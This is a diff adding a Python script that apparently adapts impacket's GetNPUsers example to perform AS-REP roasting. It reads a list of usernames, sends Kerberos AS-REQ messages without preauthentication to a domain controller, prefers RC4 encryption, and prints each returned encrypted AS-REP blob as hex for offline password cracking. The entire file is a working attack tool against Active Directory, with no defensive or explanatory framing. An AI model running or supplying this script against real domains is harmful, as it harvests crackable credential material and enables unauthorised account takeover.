@@ -1,1 +1,109 @@
+#!/usr/bin/env python
 
+import argparse
+import datetime
+import logging
+import random
+import sys
+from binascii import hexlify
+
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+
+from impacket import version
+from impacket.examples import logger
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+from impacket.krb5.types import KerberosTime, Principal
+
+class GetUserNoPreAuth:
+    def __init__(self, users_file='user.txt', kdc_ip='DC01.local'):
+        self.__domain = 'DC01.local'
+        self.__usersFile = users_file
+        self.__kdcIP = kdc_ip
+
+    def getTGT(self, userName, requestPAC=True):
+        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        asReq = AS_REQ()
+        domain = self.__domain.upper()
+        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        pacRequest = KERB_PA_PAC_REQUEST()
+        pacRequest['include-pac'] = requestPAC
+        encodedPacRequest = encoder.encode(pacRequest)
+
+        asReq['pvno'] = 5
+        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+        asReq['padata'] = noValue
+        asReq['padata'][0] = noValue
+        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+        reqBody = seq_set(asReq, 'req-body')
+
+        opts = [
+            constants.KDCOptions.forwardable.value,
+            constants.KDCOptions.renewable.value,
+            constants.KDCOptions.proxiable.value,
+        ]
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+        reqBody['realm'] = domain
+
+        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['rtime'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+
+        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+        seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+        message = encoder.encode(asReq)
+
+        try:
+            r = sendReceive(message, domain, self.__kdcIP)
+        except KerberosError as e:
+            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                supportedCiphers = (
+                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
+                )
+                seq_set_iter(reqBody, 'etype', supportedCiphers)
+                message = encoder.encode(asReq)
+                r = sendReceive(message, domain, self.__kdcIP)
+            else:
+                raise e
+
+        try:
+            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+        except:
+            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+        else:
+            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
+
+        return userName, hexlify(asRep['enc-part']['cipher'].asOctets()).decode()
+
+    def run(self):
+        with open(self.__usersFile) as f:
+            usernames = [line.strip() for line in f]
+
+        for username in usernames:
+            try:
+                user, tgt = self.getTGT(username)
+                print(f'User: {user}, TGT: {tgt}')
+            except Exception as e:
+                logging.error(f'Error processing {username}: {str(e)}')
+
+if __name__ == '__main__':
+    print(version.BANNER)
+
+    logger.init()
+
+    try:
+        executer = GetUserNoPreAuth()
+        executer.run()
+    except Exception as e:
+        logging.error(str(e))
